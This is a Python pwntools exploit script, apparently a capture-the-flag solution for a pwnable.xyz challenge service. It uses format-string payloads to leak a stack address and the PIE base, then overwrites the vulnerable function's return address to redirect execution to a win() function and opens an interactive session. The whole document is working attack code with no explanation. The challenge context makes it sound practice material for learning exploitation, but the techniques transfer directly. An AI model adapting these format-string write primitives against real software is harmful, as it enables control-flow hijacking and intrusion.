from pwn import *

r = remote("svc.pwnable.xyz", 30010)

sla = r.sendlineafter
sa = r.sendafter


def edit_name(name):
    sla(b"> ", b"1")
    sa(b"Name: ", name)


def prep_msg():
    sla(b"> ", b"2")


def print_msg():
    sla(b"> ", b"3")


# leak stack address
sa(b"Name: ", b"a" * 0x19 + b"%10$p")
prep_msg()
ebp = int(r.recvn(10)[2:], 16)  # ebp of main()
log.info(f"ebp of vuln(): {hex(ebp)}")

# leak pie
edit_name(b"a" * 0x19 + b"%11$p")
prep_msg()
pie = int(r.recvn(10)[2:], 16) - 0xA77  # pie base
log.info(f"pie base: {hex(pie)}")
cmd = pie + 0x2040
win = pie + 0x9FD

# extend format string
edit_name(b"a" * 0x19 + b"a%6$hn")
sla(b"> ", str((cmd & 0xFFFFFF00) + 2).encode())
for i in range(0x26, 0x30):
    sla(b"> ", str(cmd + i).encode())

# overwrite return address of vuln()
sla(b"> ", str(((ebp - 0xC) & 0xFFFFFF00) + 1 - 0x100000000).encode())
sa(b"Name: ", f"%{str((win & 0xffff) - 0xb)}c%6$hn\x00".encode())
sla(b"> ", str(ebp - 0xC - 0x100000000).encode())

# return vuln() => call win()
sla(b"> ", b"0")

r.interactive()
